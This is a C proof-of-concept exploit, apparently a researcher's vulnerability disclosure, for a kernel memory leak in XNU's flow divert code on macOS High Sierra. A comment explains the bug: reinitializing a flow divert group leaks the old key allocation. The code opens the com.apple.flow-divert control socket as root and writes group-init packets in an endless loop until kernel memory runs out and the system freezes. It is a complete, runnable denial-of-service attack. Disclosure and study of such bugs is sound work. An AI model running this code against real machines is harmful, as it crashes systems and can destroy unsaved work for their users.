/*
 * flow_divert-memleak.c
 * Brandon Azad
 *
 * The function flow_divert_handle_group_init in XNU (file bsd/netinet/flow_divert.c) is
 * responsible for initializing a flow divert group's secret key data. It is reachable from user
 * space by creating a kernel control socket for com.apple.flow-divert and then writing a packet of
 * type FLOW_DIVERT_PKT_GROUP_INIT to the control socket.
 *
 * While manually inspecting this function I noticed that any previous key data stored in the group
 * is not cleared before the new key is set. This is problematic because nothing prevents an
 * already-initialized group from being reinitialized with a new key. Thus, each previous key
 * allocation will be leaked as the group is reinitialized.
 *
 * This proof-of-concept exploit crashes the system by repeatedly allocating and leaking memory
 * from the kalloc.1024 zone. It takes about ten seconds to freeze my 2011 Macbook Pro running
 * macOS High Sierra 17A362a.
 *
 * Opening the control socket to com.apple.flow-divert requires root privileges.
 */

#include <errno.h>
#include <net/if.h>
#include <stdio.h>
#include <string.h>
#include <sys/sys_domain.h>
#include <sys/kern_control.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define FLOW_DIVERT_MAX_KEY_SIZE 1024

int main() {
	// Open the control socket for com.apple.flow-divert. Requires root.
	int ctlfd = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL);
	if (ctlfd < 0) {
		printf("socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL) failed: %d\n", errno);
		return 1;
	}
	struct ctl_info ctlinfo = { .ctl_id = 0 };
	strncpy(ctlinfo.ctl_name, "com.apple.flow-divert", sizeof(ctlinfo.ctl_name));
	int err = ioctl(ctlfd, CTLIOCGINFO, &ctlinfo);
	if (err) {
		printf("ioctl(ctlfd, CTLIOCGINFO, &info) failed: %d\n", errno);
		return 2;
	}
	struct sockaddr_ctl addr = {
		.sc_len     = sizeof(addr),
		.sc_family  = AF_SYSTEM,
		.ss_sysaddr = AF_SYS_CONTROL,
		.sc_id      = ctlinfo.ctl_id, // com.apple.flow-divert
		.sc_unit    = 1,              // g_flow_divert_groups[1]
	};
	err = connect(ctlfd, (struct sockaddr *)&addr, sizeof(addr));
	if (err) {
		printf("connect(ctlfd, &addr{sc_id:%d, sc_unit:%d}, sizeof(addr)) failed: %d\n",
				addr.sc_id, addr.sc_unit, errno);
		return 3;
	}

	// Initialize the control group.
	struct __attribute__((packed)) {
		uint8_t  packet_type;
		uint8_t  pad1[3];
		uint32_t conn_id;
		uint8_t  token_key_type;
		uint32_t token_key_length;
		uint8_t  token_key_value[FLOW_DIVERT_MAX_KEY_SIZE];
	} group_init = {
		.packet_type      = 6,       // FLOW_DIVERT_PKT_GROUP_INIT
		.conn_id          = 0,       // No connection.
		.token_key_type   = 17,      // FLOW_DIVERT_TLV_TOKEN_KEY
		.token_key_length = htonl(sizeof(group_init.token_key_value)),
		.token_key_value  = { 0 },
	};
	for (;;) {
		ssize_t written = write(ctlfd, &group_init, sizeof(group_init));
		if (written != sizeof(group_init)) {
			printf("write(ctlfd, &group_init, sizeof(group_init)) failed: %d\n", errno);
			return 4;
		}
	}

	// Close the socket.
	close(ctlfd);
	return 0;
}
